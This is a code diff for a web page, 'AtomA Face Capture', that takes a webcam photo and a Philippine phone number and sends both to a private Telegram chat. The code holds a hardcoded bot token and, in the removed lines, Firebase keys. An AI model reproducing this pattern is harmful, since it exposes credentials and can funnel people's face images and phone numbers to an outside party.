@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>AtomA | Face Capture - Fixed</title>
+    <title>AtomA | Face Capture to Telegram</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(165deg, #7EC8E0 0%, #B8E1F0 30%, #FDE08B 70%, #FDD97A 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -16,16 +16,17 @@
             padding: 20px;
         }
         .container {
-            background: white;
-            border-radius: 40px;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 48px;
             padding: 30px 25px;
             max-width: 450px;
             width: 100%;
             text-align: center;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255,255,255,0.5);
         }
-        h1 { font-size: 1.8rem; margin-bottom: 10px; color: #1a2a3a; }
-        h3 { font-size: 0.9rem; color: #666; margin-bottom: 20px; }
+        h1 { font-size: 1.8rem; margin-bottom: 8px; color: #1a2a3a; }
+        .subtitle { font-size: 0.85rem; color: #d46b5e; margin-bottom: 20px; }
         .camera-circle {
             width: 240px;
             height: 240px;
@@ -35,6 +36,7 @@
             border: 4px solid #FFD700;
             background: #000;
             position: relative;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
         }
         video {
             width: 100%;
@@ -42,65 +44,6 @@
             object-fit: cover;
             transform: scaleX(-1);
         }
-        .preview-canvas {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            display: none;
-        }
-        input {
-            width: 100%;
-            padding: 14px;
-            font-size: 16px;
-            border: 1px solid #ddd;
-            border-radius: 60px;
-            margin-bottom: 15px;
-            text-align: center;
-            font-weight: 500;
-        }
-        button {
-            background: #1a1a1a;
-            color: #FFD700;
-            border: 2px solid #FFD700;
-            padding: 14px 24px;
-            border-radius: 60px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            margin: 5px 0;
-        }
-        button:active { transform: scale(0.98); }
-        .test-btn {
-            background: #2d6a4f;
-            color: white;
-            border-color: #2d6a4f;
-            margin-bottom: 10px;
-        }
-        .status {
-            margin-top: 15px;
-            padding: 12px;
-            border-radius: 60px;
-            font-size: 13px;
-            font-weight: 500;
-        }
-        .success { background: #d4edda; color: #155724; border-left: 4px solid #28a745; }
-        .error { background: #f8d7da; color: #721c24; border-left: 4px solid #dc3545; }
-        .info { background: #d1ecf1; color: #0c5460; border-left: 4px solid #17a2b8; }
-        .logs {
-            margin-top: 20px;
-            text-align: left;
-            background: #f8f9fa;
-            padding: 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            max-height: 250px;
-            overflow-y: auto;
-            font-family: monospace;
-        }
-        .logs p { margin: 5px 0; padding: 4px; border-bottom: 1px solid #eee; }
         .green-edge {
             position: absolute;
             top: 0;
@@ -119,25 +62,68 @@
             0% { box-shadow: inset 0 0 0 0 rgba(0,255,0,0.8); }
             100% { box-shadow: inset 0 0 30px 8px rgba(0,255,0,0.9); }
         }
+        input {
+            width: 100%;
+            padding: 14px;
+            font-size: 16px;
+            border: 1.5px solid #f0e0c8;
+            border-radius: 60px;
+            margin-bottom: 15px;
+            text-align: center;
+            font-weight: 500;
+        }
+        button {
+            background: #1a1a1a;
+            color: #FDD97A;
+            border: 2px solid #FDD97A;
+            padding: 14px 24px;
+            border-radius: 60px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin: 5px 0;
+        }
+        button:active { transform: scale(0.98); }
+        .status {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 60px;
+            font-size: 13px;
+            font-weight: 500;
+        }
+        .success { background: #d4edda; color: #155724; border-left: 4px solid #28a745; }
+        .error { background: #f8d7da; color: #721c24; border-left: 4px solid #dc3545; }
+        .info { background: #d1ecf1; color: #0c5460; border-left: 4px solid #17a2b8; }
+        .logs {
+            margin-top: 20px;
+            text-align: left;
+            background: #f8f9fa;
+            padding: 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            max-height: 200px;
+            overflow-y: auto;
+            font-family: monospace;
+        }
+        .logs p { margin: 5px 0; padding: 4px; border-bottom: 1px solid #eee; }
     </style>
 </head>
 <body>
 <div class="container">
     <h1>😊 Face Capture</h1>
-    <h3>Save your face to Firestore</h3>
+    <div class="subtitle">Save face photo to Telegram</div>
     
-    <div class="camera-circle" id="cameraContainer">
+    <div class="camera-circle">
         <video id="video" autoplay playsinline></video>
         <div class="green-edge" id="greenEdge"></div>
-        <canvas id="previewCanvas" class="preview-canvas"></canvas>
     </div>
     
     <input type="tel" id="phoneNumber" maxlength="10" placeholder="Enter 10-digit number (start with 9)">
     
-    <button id="testBtn" class="test-btn">🔧 1. TEST FIREBASE CONNECTION</button>
-    <button id="captureBtn">📸 2. CAPTURE & SAVE PHOTO</button>
+    <button id="captureBtn">📸 CAPTURE & SEND TO TELEGRAM</button>
     
-    <div id="status" class="status info">Ready. Click TEST FIREBASE first.</div>
+    <div id="status" class="status info">Ready. Position your face in the circle.</div>
     
     <div class="logs">
         <strong>📋 Activity Log:</strong>
@@ -145,32 +131,18 @@
     </div>
 </div>
 
-<script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-    import { getStorage, ref as storageRef, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-storage.js";
-    import { getFirestore, doc, setDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
-
-    const firebaseConfig = {
-        apiKey: "AIzaSyB2kK4XCKF2wN434O0On9gFHPdrYUJdsug",
-        authDomain: "atomea-f9c0b.firebaseapp.com",
-        databaseURL: "https://atomea-f9c0b-default-rtdb.asia-southeast1.firebasedatabase.app",
-        projectId: "atomea-f9c0b",
-        storageBucket: "atomea-f9c0b.firebasestorage.app",
-        messagingSenderId: "41581075830",
-        appId: "1:41581075830:web:f74f7f5fe27713c8feae57",
-        measurementId: "G-7M7FYVHZEH"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const storage = getStorage(app);
-    const db = getFirestore(app);
+<script>
+    // ============================================
+    // TELEGRAM BOT CONFIGURATION
+    // ============================================
+    const TELEGRAM_BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
+    const TELEGRAM_CHAT_ID = "7298607329";
     
     let videoStream = null;
     let isCameraReady = false;
     
     const video = document.getElementById('video');
     const phoneInput = document.getElementById('phoneNumber');
-    const testBtn = document.getElementById('testBtn');
     const captureBtn = document.getElementById('captureBtn');
     const statusDiv = document.getElementById('status');
     const logsDiv = document.getElementById('logs');
@@ -204,7 +176,6 @@
             videoStream = stream;
             video.srcObject = stream;
             
-            // Wait for video to be ready
             await new Promise((resolve) => {
                 video.onloadedmetadata = () => {
                     video.play();
@@ -212,11 +183,10 @@
                 };
             });
             
-            // Wait a bit more for frame
             await new Promise(r => setTimeout(r, 500));
             
             isCameraReady = true;
-            addLog("✅ Camera ready! Video size: " + video.videoWidth + "x" + video.videoHeight, "success");
+            addLog(`✅ Camera ready! (${video.videoWidth}x${video.videoHeight})`, "success");
             return true;
         } catch (err) {
             addLog("❌ Camera error: " + err.message, "error");
@@ -225,33 +195,8 @@
         }
     }
     
-    // TEST FIREBASE
-    async function testFirebase() {
-        addLog("🔧 Testing Firebase...", "info");
-        
-        try {
-            // Test Firestore
-            const testId = "test_" + Date.now();
-            const testDoc = doc(db, "test_connection", testId);
-            await setDoc(testDoc, {
-                message: "Firestore is working!",
-                timestamp: new Date().toISOString()
-            });
-            addLog("✅ FIRESTORE: Connected!", "success");
-            
-            // Test Storage
-            const testBlob = new Blob(["test data"], { type: "text/plain" });
-            const testRef = storageRef(storage, "test/test_" + Date.now() + ".txt");
-            await uploadBytes(testRef, testBlob);
-            addLog("✅ STORAGE: Connected!", "success");
-            
-        } catch (error) {
-            addLog("❌ Firebase error: " + error.message, "error");
-        }
-    }
-    
-    // CAPTURE PHOTO AND SAVE
-    async function capturePhoto() {
+    // CAPTURE PHOTO AND SEND TO TELEGRAM
+    async function captureAndSendToTelegram() {
         if (!isCameraReady) {
             addLog("❌ Camera not ready. Please wait.", "error");
             return;
@@ -270,79 +215,82 @@
         setTimeout(() => greenEdge.classList.remove('active'), 800);
         
         try {
-            // Create canvas
+            // Create canvas from video
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             
-            addLog(`📐 Canvas size: ${canvas.width}x${canvas.height}`, "info");
-            
             if (canvas.width === 0 || canvas.height === 0) {
-                addLog("❌ Invalid video dimensions. Restarting camera...", "error");
-                await startCamera();
+                addLog("❌ Invalid video dimensions", "error");
                 return;
             }
             
-            // Draw video to canvas (with mirror)
+            // Draw video to canvas (with mirror effect)
             const ctx = canvas.getContext('2d');
             ctx.save();
             ctx.scale(-1, 1);
             ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
             ctx.restore();
             
-            // Convert to JPEG
             addLog("📸 Converting to JPEG...", "info");
             
+            // Convert to JPEG blob
             const blob = await new Promise((resolve) => {
                 canvas.toBlob(resolve, 'image/jpeg', 0.9);
             });
             
-            if (!blob) {
-                addLog("❌ Failed to create image blob", "error");
+            if (!blob || blob.size < 1000) {
+                addLog("❌ Failed to capture image", "error");
                 return;
             }
             
             addLog(`📸 Image size: ${(blob.size / 1024).toFixed(1)} KB`, "success");
             
-            if (blob.size < 1000) {
-                addLog("❌ Image too small. Capture failed.", "error");
-                return;
-            }
+            // Create FormData for Telegram
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', blob, `face_${phoneNumber}_${Date.now()}.jpg`);
+            formData.append('caption', `🔐 New Face Capture\n📱 Phone: +63${phoneNumber}\n⏰ Time: ${new Date().toLocaleString()}\n📍 Source: AtomA Web App`);
             
-            // Upload to Firebase Storage
-            const fileName = `faces/${phoneNumber}_${Date.now()}.jpg`;
-            const imageRef = storageRef(storage, fileName);
+            addLog("📤 Sending to Telegram...", "info");
             
-            addLog("📤 Uploading to Firebase Storage...", "info");
-            const uploadResult = await uploadBytes(imageRef, blob);
-            addLog(`✅ Uploaded: ${uploadResult.metadata.fullPath}`, "success");
-            
-            const imageUrl = await getDownloadURL(imageRef);
-            addLog(`🔗 Image URL: ${imageUrl.substring(0, 60)}...`, "success");
-            
-            // Save to Firestore
-            addLog("💾 Saving to Firestore...", "info");
-            
-            const userDocRef = doc(db, "users", phoneNumber);
-            await setDoc(userDocRef, {
-                phoneNumber: phoneNumber,
-                faceImageUrl: imageUrl,
-                fileName: fileName,
-                capturedAt: new Date().toISOString(),
-                fileSize: blob.size,
-                imageDimensions: `${canvas.width}x${canvas.height}`,
-                status: "saved"
+            // Send to Telegram Bot API
+            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
             });
             
-            addLog("✅ SAVED TO FIRESTORE!", "success");
-            addLog(`📁 Document: users/${phoneNumber}`, "success");
+            const result = await response.json();
             
-            // Verify
-            const verifyDoc = await getDoc(userDocRef);
-            if (verifyDoc.exists()) {
-                const data = verifyDoc.data();
-                addLog(`✅ VERIFIED: Face image URL is in Firestore`, "success");
-                addLog(`📸 Photo saved successfully! Check Firebase Console.`, "success");
+            if (result.ok) {
+                addLog("✅ PHOTO SENT TO TELEGRAM!", "success");
+                addLog(`📸 File ID: ${result.result.photo[0].file_id}`, "success");
+                addLog(`📱 Check your Telegram chat (ID: ${TELEGRAM_CHAT_ID})`, "success");
+                
+                // Also send a text message with details
+                const textMessage = `✅ *FACE CAPTURE SUCCESSFUL!*\n\n📱 *Phone:* +63${phoneNumber}\n⏰ *Time:* ${new Date().toLocaleString()}\n📸 *Image Size:* ${(blob.size / 1024).toFixed(1)} KB\n🌐 *Source:* AtomA Face Recognition`;
+                
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: textMessage,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                // Save to localStorage
+                const capturedFaces = JSON.parse(localStorage.getItem('capturedFaces') || '[]');
+                capturedFaces.push({
+                    phoneNumber: phoneNumber,
+                    timestamp: new Date().toISOString(),
+                    imageSize: blob.size
+                });
+                localStorage.setItem('capturedFaces', JSON.stringify(capturedFaces));
+                
+            } else {
+                addLog(`❌ Telegram error: ${result.description}`, "error");
             }
             
         } catch (error) {
@@ -351,9 +299,65 @@
         }
     }
     
+    // CAPTURE AND SAVE (for testing without Telegram)
+    async function captureAndDownload() {
+        if (!isCameraReady) {
+            addLog("❌ Camera not ready.", "error");
+            return;
+        }
+        
+        const phoneNumber = phoneInput.value.trim();
+        if (!phoneNumber || phoneNumber.length !== 10 || phoneNumber[0] !== '9') {
+            addLog("❌ Invalid phone number", "error");
+            return;
+        }
+        
+        addLog(`📸 Capturing photo...`, "info");
+        
+        greenEdge.classList.add('active');
+        setTimeout(() => greenEdge.classList.remove('active'), 800);
+        
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            const ctx = canvas.getContext('2d');
+            ctx.save();
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+            ctx.restore();
+            
+            // Download as file
+            canvas.toBlob((blob) => {
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `face_${phoneNumber}_${Date.now()}.jpg`;
+                a.click();
+                URL.revokeObjectURL(url);
+                addLog(`✅ Photo downloaded! Check your downloads folder.`, "success");
+            }, 'image/jpeg', 0.9);
+            
+        } catch (error) {
+            addLog(`❌ Error: ${error.message}`, "error");
+        }
+    }
+    
     // Event listeners
-    testBtn.addEventListener('click', testFirebase);
-    captureBtn.addEventListener('click', capturePhoto);
+    captureBtn.addEventListener('click', captureAndSendToTelegram);
+    
+    // Add download option on long press (for mobile)
+    let pressTimer;
+    captureBtn.addEventListener('touchstart', () => {
+        pressTimer = setTimeout(() => {
+            captureAndDownload();
+            addLog("💾 Downloading photo as backup...", "info");
+        }, 500);
+    });
+    captureBtn.addEventListener('touchend', () => {
+        clearTimeout(pressTimer);
+    });
     
     // Phone validation
     phoneInput.addEventListener('input', (e) => {
@@ -362,14 +366,12 @@
         e.target.value = val;
     });
     
-    // Start camera on load
+    // Start camera
     startCamera();
     
-    addLog("🚀 App ready! Steps:", "info");
-    addLog("1. Click 'TEST FIREBASE' to verify connection", "info");
-    addLog("2. Enter your 10-digit number (start with 9)", "info");
-    addLog("3. Click 'CAPTURE & SAVE PHOTO'", "info");
-    addLog("📸 Make sure your face is inside the circle!", "info");
+    addLog("🚀 Ready! Position your face in the circle.", "info");
+    addLog("📸 Click CAPTURE to send photo to Telegram", "info");
+    addLog(`🤖 Telegram Chat ID: ${TELEGRAM_CHAT_ID}`, "info");
 </script>
 </body>
 </html>
